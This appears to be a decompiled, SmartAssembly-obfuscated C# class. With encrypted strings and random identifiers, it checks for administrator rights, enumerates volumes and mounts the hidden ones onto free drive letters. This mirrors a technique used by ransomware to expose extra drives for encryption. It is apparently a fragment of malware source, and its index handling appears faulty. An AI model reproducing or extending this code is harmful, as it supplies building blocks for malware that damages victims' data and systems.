using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wmzoZRdMaf;

public static class TJIsUoXYwUTtkR
{
	public enum goWnNBZLSLDbWL : uint
	{
		MYtvBVbFNmD,
		KcAhUKjRPIXK,
		ieAQMxMNXhiPlc,
		nljxNfZryZjfcAI,
		HCQgiclhusicm,
		BZYeXJiqyrm,
		RcDqwauDoThw
	}

	private sealed class xPNqRjlemLjUFT
	{
		public uint ihckrXFpHrQbtTD;

		public uint CRbkcQNUwQEof;

		public char[] FQteKPoorJWmQ;

		public bool _003CMountVolumes_003Eb__0(string string_0)
		{
			if (GetVolumePathNamesForVolumeNameW(string_0, FQteKPoorJWmQ, CRbkcQNUwQEof, ref ihckrXFpHrQbtTD))
			{
				return FQteKPoorJWmQ.Length != 3;
			}
			return true;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	public static extern goWnNBZLSLDbWL GetDriveType([MarshalAs(UnmanagedType.LPStr)] string KnhQPVoLMFhFX);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string UwSXUpuiwPjBhEyQ, char[] JDdBoccFzIkVEgl, uint PEmGzChZaTMRL, ref uint dgTAyCEozJiE);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string string_0, string string_1);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder stringBuilder_0, int int_0);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int int_0, StringBuilder stringBuilder_0, int int_1);

	public static List<string> EctOPvegJHi()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int int_ = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(int_, stringBuilder, 1024));
		return list;
	}

	public static void VSXOfkodFLU()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			xPNqRjlemLjUFT CS_0024_003C_003E8__locals0 = new xPNqRjlemLjUFT();
			string[] array = new string[26]
			{
				getString_0(107400033),
				getString_0(107399996),
				getString_0(107399991),
				getString_0(107399986),
				getString_0(107400013),
				getString_0(107400008),
				getString_0(107400003),
				getString_0(107399966),
				getString_0(107399961),
				getString_0(107399956),
				getString_0(107399983),
				getString_0(107399978),
				getString_0(107399973),
				getString_0(107399968),
				getString_0(107400443),
				getString_0(107400438),
				getString_0(107400433),
				getString_0(107400460),
				getString_0(107400455),
				getString_0(107400450),
				getString_0(107400413),
				getString_0(107400408),
				getString_0(107400403),
				getString_0(107400430),
				getString_0(107400425),
				getString_0(107400420)
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == goWnNBZLSLDbWL.KcAhUKjRPIXK)
				{
					array2[num++] = text;
				}
			}
			List<string> source = EctOPvegJHi();
			CS_0024_003C_003E8__locals0.ihckrXFpHrQbtTD = 0u;
			CS_0024_003C_003E8__locals0.CRbkcQNUwQEof = 120u;
			CS_0024_003C_003E8__locals0.FQteKPoorJWmQ = new char[260];
			foreach (string item in source.Where((string string_0) => !GetVolumePathNamesForVolumeNameW(string_0, CS_0024_003C_003E8__locals0.FQteKPoorJWmQ, CS_0024_003C_003E8__locals0.CRbkcQNUwQEof, ref CS_0024_003C_003E8__locals0.ihckrXFpHrQbtTD) || CS_0024_003C_003E8__locals0.FQteKPoorJWmQ.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (IuKjJmfJcVBFA.COsiatrWvUa)
				{
					try
					{
						Console.WriteLine(getString_0(107400383), array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (IuKjJmfJcVBFA.JkprrzFPchvjDH)
			{
				try
				{
					File.AppendAllText(IuKjJmfJcVBFA.AIOBtLgIwjoLs, getString_0(107400390) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static TJIsUoXYwUTtkR()
	{
		Strings.CreateGetStringDelegate(typeof(TJIsUoXYwUTtkR));
	}
}
